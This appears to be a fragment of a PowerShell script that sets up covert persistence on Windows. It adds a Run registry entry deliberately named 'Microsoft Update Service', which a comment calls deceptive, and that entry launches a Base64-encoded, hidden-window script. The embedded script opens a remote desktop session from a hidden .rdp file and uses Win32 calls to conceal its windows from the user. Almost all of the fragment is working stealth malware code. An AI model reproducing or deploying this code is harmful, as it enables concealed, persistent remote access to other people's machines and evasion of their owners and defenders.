...
# --- New: Create persistent startup task via Registry ---
$startupCommand = @"
# Self-contained startup script to launch and hide RDP

# --- Startup Logging Setup ---
`$startupLog = Join-Path `$env:TEMP "rdp_startup_log.txt"
Clear-Content -Path `$startupLog -ErrorAction SilentlyContinue
function Log-Startup(`$msg) {
    `$timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss.fff")
    "[`$timestamp] `$msg" | Add-Content -Path `$startupLog
}

Log-Startup "--- Startup script initiated ---"

# Wait until the user's desktop is interactive by checking for explorer.exe
Log-Startup "Waiting for explorer.exe to start..."
while (-not (Get-Process explorer -ErrorAction SilentlyContinue)) {
    Start-Sleep -Seconds 5
}
Log-Startup "explorer.exe detected. Desktop is loading."

# Add a small extra delay for desktop stability before proceeding.
Start-Sleep -Seconds 10
Log-Startup "Initial delay complete. Proceeding with RDP launch."

# Define the path to the RDP file.
`$rdpFile = Join-Path `$env:TEMP "hidden.rdp"
if (-not (Test-Path `$rdpFile)) {
    Log-Startup "ERROR: rdp file not found at '`$rdpFile'. Exiting."
    return
}

# Add the Win32 helper class to hide windows. This must be self-contained.
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class Win32Stealth {
    private const int GWL_EXSTYLE = -20;
    private const int WS_EX_TOOLWINDOW = 0x80;
    private const int WS_EX_APPWINDOW = 0x40000;
    private const uint SWP_NOSIZE = 0x0001;
...
# The server name, which will be used to identify the final RDP window.
`$serverName = '$server'

# Launch the RDP process, minimized.
Log-Startup "Launching mstsc.exe for server '$server'..."
`$proc = Start-Process -FilePath "mstsc.exe" -ArgumentList "`$rdpFile" -PassThru -WindowStyle Minimized
`$mstscId = `$proc.Id
Log-Startup "mstsc.exe started with PID `$mstscId."

# Poll for up to 30 seconds to find and hide the RDP window robustly.
`$stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
`$timeoutSeconds = 30
`$finalWindowHidden = `$false
Log-Startup "Starting to poll for RDP windows for up to `$timeoutSeconds seconds..."

while (`$stopwatch.Elapsed.TotalSeconds -lt `$timeoutSeconds -and -not `$finalWindowHidden) {
    `$callback = {
        param(`$hWnd, `$lParam)
        `$pId = 0
        [Win32Stealth]::GetWindowThreadProcessId(`$hWnd, [ref]`$pId) | Out-Null
        
        if (`$pId -eq `$script:mstscId) {
            `$sb = New-Object System.Text.StringBuilder 256
            [Win32Stealth]::GetWindowText(`$hWnd, `$sb, `$sb.Capacity) | Out-Null
            `$windowTitle = `$sb.ToString()
            
            # Log and hide any window associated with the process
            `$logMsg = "Found RDP window (PID `$pId, Title: '`$windowTitle'). Hiding it."
            `$timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss.fff")
            "[`$timestamp] `$logMsg" | Add-Content -Path `$script:startupLog -ErrorAction SilentlyContinue
            [Win32Stealth]::HideWindowAggressively(`$hWnd)
            
            if (`$windowTitle -eq `$script:serverName) {
                `$logMsg = "Success: Final RDP window with title '`$windowTitle' found and hidden."
                `$timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss.fff")
                "[`$timestamp] `$logMsg" | Add-Content -Path `$script:startupLog -ErrorAction SilentlyContinue
                `$script:finalWindowHidden = `$true
            }
        }
        return `$true # Continue enumerating.
    }

    # Set variables into the script scope so they are accessible by the callback.
    `$script:mstscId = `$mstscId
    `$script:serverName = `$serverName
    `$script:finalWindowHidden = `$finalWindowHidden
    `$script:startupLog = `$startupLog
    
    [Win32Stealth]::EnumWindows($callback, [IntPtr]::Zero) | Out-Null

    # If the main window is hidden, we can exit the loop early.
    if (`$script:finalWindowHidden) {
        break
    }
...
if (`$finalWindowHidden) {
    Log-Startup "Polling complete. Main window was hidden successfully."
} else {
    Log-Startup "Warning: Polling timed out after `$timeoutSeconds seconds. The main RDP window may not have been hidden."
}
Log-Startup "--- Startup script finished ---"
"@

# Encode the command in Base64 to avoid issues with quotes and special characters in the registry.
$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($startupCommand))
$registryCommand = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encodedCommand"

# The registry path for user-specific startup items.
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$registryValueName = "Microsoft Update Service" # A deceptive name for the registry entry.

try {
    # Create or update the registry key to run our script on startup.
    # The -Force parameter ensures it overwrites any existing entry with the same name.
    Set-ItemProperty -Path $registryPath -Name $registryValueName -Value $registryCommand -Force
    Log "Created persistence mechanism via registry: $registryPath\$registryValueName"
} catch {
    Log "ERROR: Failed to create persistence registry key: `$_"
}
